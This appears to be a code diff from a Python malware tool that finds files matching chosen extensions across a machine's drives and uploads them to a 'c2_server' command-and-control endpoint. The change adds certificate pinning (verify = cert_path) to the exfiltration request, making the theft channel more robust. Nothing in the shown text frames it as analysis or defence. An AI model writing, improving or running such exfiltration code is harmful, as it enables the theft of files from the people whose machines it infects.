@@ -2,7 +2,7 @@ import os
 import requests
 from System.Driver_Handling import root_paths
 from Session.Token_Handling import token_check
-from Core.Variables import extesions, c2_server
+from Core.Variables import extesions, c2_server, cert_path
 
 def find_files_upload():
     root_path = root_paths()
@@ -19,7 +19,7 @@ def upload_file(file_path_upload):
     try:
         with open(file_path_upload, "rb") as f:
             files = {"file": (os.path.basename(file_path_upload), f)}
-            response = requests.post(c2_server + "/upload_file", files=files, headers=headers)
+            response = requests.post(c2_server + "/upload_file", files=files, headers=headers, verify = cert_path)
         
         if response.status_code == 200:
             print("File Uploaded")
